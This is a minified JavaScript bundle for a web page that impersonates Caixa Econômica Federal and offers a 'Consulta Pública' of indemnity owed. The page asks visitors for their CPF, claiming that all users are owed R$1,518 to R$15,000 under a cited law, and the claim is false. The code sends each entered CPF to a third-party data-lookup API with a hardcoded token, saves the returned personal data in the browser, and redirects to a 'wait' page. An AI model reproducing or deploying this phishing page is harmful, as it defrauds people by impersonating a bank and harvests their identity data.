(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [399], {
    201: (e, t, s) => {
      "use strict";
      s.r(t), s.d(t, {
        default: () => U
      });
      var i = s(6814),
        a = s(2094),
        r = s(8421),
        n = s(6695),
        l = s(4682);

      function o(e) {
        let {
          className: t,
          type: s,
          ...a
        } = e;
        return (0, i.jsx)("input", {
          type: s,
          "data-slot": "input",
          className: (0, l.cn)("file:text-foreground placeholder:text-muted-foreground selection:bg-primary selection:text-primary-foreground dark:bg-input/30 border-input flex h-9 w-full min-w-0 rounded-md border bg-transparent px-3 py-1 text-base shadow-xs transition-[color,box-shadow] outline-none file:inline-flex file:h-7 file:border-0 file:bg-transparent file:text-sm file:font-medium disabled:pointer-events-none disabled:cursor-not-allowed disabled:opacity-50 md:text-sm", "aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive", t),
          ...a
        })
      }
      s(395);
      var c = s(6352),
        d = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "select", "span", "svg", "ul"].reduce((e, t) => {
          let s = (0, c.TL)(`Primitive.${t}`),
            r = a.forwardRef((e, a) => {
              let {
                asChild: r,
                ...n
              } = e;
              return "undefined" != typeof window && (window[Symbol.for("radix-ui")] = !0), (0, i.jsx)(r ? s : t, {
                ...n,
                ref: a
              })
            });
          return r.displayName = `Primitive.${t}`, {
            ...e,
            [t]: r
          }
        }, {}),
        u = a.forwardRef((e, t) => (0, i.jsx)(d.label, {
          ...e,
          ref: t,
          onMouseDown: t => {
            var s;
            t.target.closest("button, input, select, textarea") || (null == (s = e.onMouseDown) || s.call(e, t), !t.defaultPrevented && t.detail > 1 && t.preventDefault())
          }
        }));

      function h(e) {
        let {
          className: t,
          ...s
        } = e;
        return (0, i.jsx)(u, {
          "data-slot": "label",
          className: (0, l.cn)("flex items-center gap-2 text-sm leading-none font-medium select-none group-data-[disabled=true]:pointer-events-none group-data-[disabled=true]:opacity-50 peer-disabled:cursor-not-allowed peer-disabled:opacity-50", t),
          ...s
        })
      }
      u.displayName = "Label";
      var m = s(9579),
        p = s(7670);
      let x = (0, p.A)("info", [
          ["circle", {
            cx: "12",
            cy: "12",
            r: "10",
            key: "1mglay"
          }],
          ["path", {
            d: "M12 16v-4",
            key: "1dtifu"
          }],
          ["path", {
            d: "M12 8h.01",
            key: "e9boi3"
          }]
        ]),
        f = (0, p.A)("triangle-alert", [
          ["path", {
            d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",
            key: "wmoenq"
          }],
          ["path", {
            d: "M12 9v4",
            key: "juzpu7"
          }],
          ["path", {
            d: "M12 17h.01",
            key: "p32p05"
          }]
        ]),
        g = (0, p.A)("circle-check", [
          ["circle", {
            cx: "12",
            cy: "12",
            r: "10",
            key: "1mglay"
          }],
          ["path", {
            d: "m9 12 2 2 4-4",
            key: "dzmm74"
          }]
        ]),
        b = (0, p.A)("circle-x", [
          ["circle", {
            cx: "12",
            cy: "12",
            r: "10",
            key: "1mglay"
          }],
          ["path", {
            d: "m15 9-6 6",
            key: "1uzhvr"
          }],
          ["path", {
            d: "m9 9 6 6",
            key: "z0biqf"
          }]
        ]),
        v = {
          default: {
            container: "bg-gray-50",
            text: "text-gray-800",
            icon: (0, i.jsx)(x, {
              className: "w-5 h-5"
            })
          },
          warning: {
            container: "bg-yellow-50 border-l-4 border-orange-400",
            text: "text-[rgba(133,100,4,1)]",
            icon: (0, i.jsx)(f, {
              className: "w-5 h-5"
            })
          },
          success: {
            container: "bg-green-50 border-l-4 border-green-500",
            text: "text-green-800",
            icon: (0, i.jsx)(g, {
              className: "w-5 h-5"
            })
          },
          error: {
            container: "bg-red-50 border-l-4 border-red-500",
            text: "text-red-800",
            icon: (0, i.jsx)(b, {
              className: "w-5 h-5"
            })
          }
        };

      function y(e) {
        let {
          className: t,
          variant: s = "default",
          icon: a,
          children: r,
          ...n
        } = e, o = v[s];
        return (0, i.jsx)("div", {
          role: "alert",
          className: (0, l.cn)("p-3 rounded-r rounded-md", o.container, t),
          ...n,
          children: (0, i.jsxs)("div", {
            className: "flex gap-3 items-start",
            children: [(0, i.jsx)("div", {
              className: (0, l.cn)("shrink-0", o.text),
              children: a || o.icon
            }), (0, i.jsx)("div", {
              className: "flex-1",
              children: r
            })]
          })
        })
      }

      function j(e) {
        let {
          className: t,
          variant: s = "default",
          ...a
        } = e;
        return (0, i.jsx)("h4", {
          className: (0, l.cn)("text-base font-bold mb-1", v[s].text, t),
          ...a
        })
      }

      function N(e) {
        let {
          className: t,
          variant: s = "default",
          ...a
        } = e;
        return (0, i.jsx)("p", {
          className: (0, l.cn)("text-sm leading-relaxed", v[s].text, t),
          ...a
        })
      }
      var w = s(8388),
        O = s(6063),
        k = s(2726),
        M = s(2900),
        S = s(7380),
        C = s(9161),
        R = s(2002),
        E = s(9928),
        P = class extends R.Q {
          #e;
          #t = void 0;
          #s;
          #i;
          constructor(e, t) {
            super(), this.#e = e, this.setOptions(t), this.bindMethods(), this.#a()
          }
          bindMethods() {
            this.mutate = this.mutate.bind(this), this.reset = this.reset.bind(this)
          }
          setOptions(e) {
            let t = this.options;
            this.options = this.#e.defaultMutationOptions(e), (0, E.f8)(this.options, t) || this.#e.getMutationCache().notify({
              type: "observerOptionsUpdated",
              mutation: this.#s,
              observer: this
            }), t?.mutationKey && this.options.mutationKey && (0, E.EN)(t.mutationKey) !== (0, E.EN)(this.options.mutationKey) ? this.reset() : this.#s?.state.status === "pending" && this.#s.setOptions(this.options)
          }
          onUnsubscribe() {
            this.hasListeners() || this.#s?.removeObserver(this)
          }
          onMutationUpdate(e) {
            this.#a(), this.#r(e)
          }
          getCurrentResult() {
            return this.#t
          }
          reset() {
            this.#s?.removeObserver(this), this.#s = void 0, this.#a(), this.#r()
          }
          mutate(e, t) {
            return this.#i = t, this.#s?.removeObserver(this), this.#s = this.#e.getMutationCache().build(this.#e, this.options), this.#s.addObserver(this), this.#s.execute(e)
          }
          #a() {
            let e = this.#s?.state ?? (0, S.$)();
            this.#t = {
              ...e,
              isPending: "pending" === e.status,
              isSuccess: "success" === e.status,
              isError: "error" === e.status,
              isIdle: "idle" === e.status,
              mutate: this.mutate,
              reset: this.reset
            }
          }
          #r(e) {
            C.jG.batch(() => {
              if (this.#i && this.hasListeners()) {
                let t = this.#t.variables,
                  s = this.#t.context;
                e?.type === "success" ? (this.#i.onSuccess?.(e.data, t, s), this.#i.onSettled?.(e.data, null, t, s)) : e?.type === "error" && (this.#i.onError?.(e.error, t, s), this.#i.onSettled?.(void 0, e.error, t, s))
              }
              this.listeners.forEach(e => {
                e(this.#t)
              })
            })
          }
        },
        A = s(5856);
      async function F(e) {
        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "findu",
          cpf = e.replace(/\D/g, ""),
          s = await fetch(`https://magmadatahub.com/api.php?token=458843df6be2d056a33f1e01bbfe931e2408f90e6fac739d10663d590f2631aa&cpf=${cpf}`);
        if (!s.ok) throw Error("Erro ao consultar CPF");
        let i = await s.json();
        return localStorage.setItem("cpf-data", JSON.stringify(i)), i
      }
      var D = s(751);

      function L() {
        let [e, t] = (0, a.useState)(""), [s, r] = (0, a.useState)(!1), [l, c] = (0, a.useState)(""), [d, u] = (0, a.useState)(!1), [p, x] = (0, a.useState)("none"), g = (0, M.useRouter)(), b = (0, M.useSearchParams)(), v = null == b ? void 0 : b.toString(), {
          mutate: S
        } = function(e, t) {
          let s = (0, A.jE)(void 0),
            [i] = a.useState(() => new P(s, e));
          a.useEffect(() => {
            i.setOptions(e)
          }, [i, e]);
          let r = a.useSyncExternalStore(a.useCallback(e => i.subscribe(C.jG.batchCalls(e)), [i]), () => i.getCurrentResult(), () => i.getCurrentResult()),
            n = a.useCallback((e, t) => {
              i.mutate(e, t).catch(E.lQ)
            }, [i]);
          if (r.error && (0, E.GU)(i.options.throwOnError, [r.error])) throw r.error;
          return {
            ...r,
            mutate: n,
            mutateAsync: r.mutate
          }
        }({
          mutationFn: e => F(e)
        }), R = async () => {
          let t = e.replace(/\D/g, "");
          if (!(0, O.Or)(t)) {
            x("invalid"), r(!0), c("CPF inv\xe1lido. Verifique os dados digitados.");
            return
          }
          x("loading"), r(!1), c(""), S(t, {
            onSuccess: async () => {
              x("valid"), window.location.href = "../3/aguarde.html".concat(v ? "?".concat(v) : "")
            },
            onError: () => {
              x("invalid"), r(!0), c("CPF inv\xe1lido ou n\xe3o encontrado. Verifique os dados e tente novamente.")
            }
          })
        }, L = 11 !== e.replace(/\D/g, "").length || "loading" === p;
        return (0, i.jsxs)(n.Zp, {
          className: "w-full max-w-md shadow-lg",
          children: [(0, i.jsxs)(n.aR, {
            className: "text-center pb-3 flex flex-col items-center justify-center",
            children: [(0, i.jsxs)("div", {
              children: [(0, i.jsx)("img", {
                src: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
                alt: "Caixa Econômica Federal",
                className: "w-36 h-auto"
              }), (0, i.jsx)(n.ZB, {
                className: "text-base font-medium text-[#165BA7]",
                children: "Consulta P\xfablica"
              })]
            }), (0, i.jsx)("p", {
              className: "text-sm text-gray-600 mt-2",
              children: 'Informe seu CPF e clique em "Consultar" para verificar o valor da sua indeniza\xe7\xe3o.'
            })]
          }), (0, i.jsxs)(n.Wu, {
            className: "space-y-4",
            children: [(0, i.jsxs)("div", {
              className: "space-y-2",
              children: [(0, i.jsx)(h, {
                htmlFor: "cpf",
                className: "text-sm font-medium text-gray-700",
                children: "CPF"
              }), (0, i.jsx)("div", {
                className: "relative",
                children: (0, i.jsx)(o, {
                  id: "cpf",
                  placeholder: "000.000.000-00",
                  className: "w-full pr-10 py-6 font-bold",
                  inputMode: "numeric",
                  value: e,
                  onChange: e => {
                    let s = e.target.value.replace(/\D/g, "").slice(0, 11),
                      i = s;
                    s.length > 3 && (i = s.slice(0, 3) + "." + s.slice(3)), s.length > 6 && (i = s.slice(0, 3) + "." + s.slice(3, 6) + "." + s.slice(6)), s.length > 9 && (i = s.slice(0, 3) + "." + s.slice(3, 6) + "." + s.slice(6, 9) + "-" + s.slice(9)), t(i), s.length > 0 && (u(!0), r(!1), c(""), x("none"))
                  },
                  onFocus: () => {
                    d || (r(!0), c("Digite o CPF corretamente."))
                  },
                  disabled: "loading" === p
                })
              }), s && (0, i.jsx)("p", {
                className: "text-red-500 text-sm mt-1",
                children: l
              })]
            }), (0, i.jsx)(m.$, {
              className: "w-full font-semibold py-6 disabled:opacity-50 disabled:cursor-not-allowed ".concat(11 === e.replace(/\D/g, "").length && "loading" !== p ? "bg-[#F29201] hover:bg-[#1e7ba6a2] text-white" : "bg-gray-400 hover:bg-gray-500 text-white"),
              disabled: L,
              onClick: R,
              children: "loading" === p ? (0, i.jsxs)("div", {
                className: "flex items-center justify-center space-x-2",
                children: [(0, i.jsx)(w.A, {
                  className: "size-4 animate-spin"
                }), (0, i.jsx)("span", {
                  children: "CONSULTANDO..."
                })]
              }) : "CONSULTAR VALORES"
            }), (0, i.jsxs)(y, {
              variant: "default",
              className: "bg-[#FEF3E1]",
              icon: (0, i.jsx)(f, {
                className: "size-6 text-[#877410]"
              }),
              children: [(0, i.jsx)(j, {
                className: "text-gray-500 text-sm",
                children: "Todos os usu\xe1rios tem direito a uma indeniza\xe7\xe3o de R$ 1.518,00 a R$ 15.000,00 como retrata\xe7\xe3o financeira."
              }), (0, i.jsx)(N, {
                className: "text-gray-500 text-xs",
                children: "- Lei n\xb0 14.833/24 publicado em 15 de agosto de 2025."
              })]
            })]
          }), (0, i.jsx)(n.wL, {
            children: (0, i.jsx)(k.w, {})
          })]
        })
      }
      var z = s(7);

      function T() {
        return (0, i.jsxs)("div", {
          className: "min-h-screen",
          style: {
            background: "linear-gradient(90deg, #015ea2, #1875a7, #2586a7, #3498a8)"
          },
          children: [(0, i.jsx)(z.A, {}), (0, i.jsx)("div", {
            className: "mx-auto p-4",
            children: (0, i.jsx)("div", {
              className: "flex justify-center",
              children: (0, i.jsx)(L, {})
            })
          })]
        })
      }

      function U() {
        return (0, i.jsx)(a.Suspense, {
          fallback: (0, i.jsx)(r.a, {}),
          children: (0, i.jsx)(T, {})
        })
      }
    },
    1652: (e, t, s) => {
      Promise.resolve().then(s.bind(s, 201))
    }
  },
  e => {
    var t = t => e(e.s = t);
    e.O(0, [734, 539, 558, 669, 788, 97, 358], () => t(1652)), _N_E = e.O()
  }
]);